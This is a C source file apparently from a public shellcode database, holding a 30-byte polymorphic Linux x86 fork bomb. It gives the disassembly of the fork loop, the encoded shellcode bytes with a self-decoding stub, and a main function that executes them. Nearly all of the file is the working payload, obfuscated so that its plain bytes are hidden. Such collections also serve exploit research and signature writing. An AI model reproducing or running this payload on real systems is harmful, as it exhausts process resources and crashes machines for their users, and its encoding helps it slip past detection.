/*
Title:	Linux x86 polymorphic forkbombe - 30 bytes
Author:	Jonathan Salwan <submit@shell-storm.org>
Web:	http://www.shell-storm.org

! Database of shellcodes: http://www.shell-storm.org/shellcode/


Disassembly of section .text:

08048054 <_a>:
 8048054:	b0 02                	mov    $0x2,%al
 8048056:	cd 80                	int    $0x80
 8048058:	eb fa                	jmp    8048054 <_a>

*/

#include <stdio.h>

char shellcode[] = 	"\xeb\x11\x5e\x31\xc9\xb1\x06\x80"
			"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
  			"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
		   	"\xb1\x03\xce\x81\xec\xfb";

int main()
{
fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
(*(void  (*)()) shellcode)();
}